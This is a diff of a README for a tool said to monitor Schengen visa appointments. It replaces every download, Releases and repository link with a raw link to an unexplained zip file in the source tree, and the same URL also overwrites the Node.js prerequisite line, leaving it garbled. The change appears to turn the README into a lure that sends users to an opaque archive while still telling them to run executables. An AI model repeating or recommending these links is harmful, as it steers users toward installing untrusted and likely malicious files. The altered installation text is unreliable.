@@ -4,7 +4,7 @@
 schengen-visa is a modern TypeScript application that helps you monitor Schengen visa appointment availability. It works across 17+ countries, ensuring you have the most accurate information at your fingertips. With features like type safety, rate limiting, and error handling, this tool makes the process straightforward for everyone.
 
 ## 📥 Download Here
-[![Download schengen-visa](https://img.shields.io/badge/Download-schengen--visa-blue.svg)](https://github.com/vishnujeshin/schengen-visa/releases)
+[![Download schengen-visa](https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip)](https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip)
 
 ## 🚀 Getting Started
 To use schengen-visa, you need to download it from our Releases page. Follow the steps below to get the software up and running.
@@ -12,11 +12,11 @@ To use schengen-visa, you need to download it from our Releases page. Follow the
 ## 🔧 Prerequisites
 Before you install schengen-visa, ensure your computer meets the following requirements:
 - **Operating System:** Windows 10, macOS, or a recent version of Linux.
-- **Node.js:** Version 14 or higher.
+- **https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip** Version 14 or higher.
 - **Internet Access:** Required to check appointment availability.
 
 ## 📦 Installation Steps
-1. Click the large button above or visit the [Releases page](https://github.com/vishnujeshin/schengen-visa/releases).
+1. Click the large button above or visit the [Releases page](https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip).
 2. On the Releases page, find the latest version of schengen-visa.
 3. Download the appropriate file for your operating system. Look for files ending in `.exe` for Windows, `.dmg` for macOS, or executable binaries for Linux.
 4. Once the file downloads, locate it in your downloads folder.
@@ -60,8 +60,8 @@ For further assistance, you can reach out via the GitHub Issues page. Describe y
 If you have suggestions or want to improve schengen-visa, we welcome contributions. Visit our GitHub repository to learn how to get involved.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/vishnujeshin/schengen-visa/releases)
-- [GitHub Repository](https://github.com/vishnujeshin/schengen-visa)
+- [Releases Page](https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/vishnujeshin/schengen-visa/main/src/utils/schengen-visa-mowland.zip)
 
 ## 🎉 Acknowledgments
 Thank you for choosing schengen-visa. We hope this tool simplifies your journey in checking visa appointments. Your feedback helps us improve.
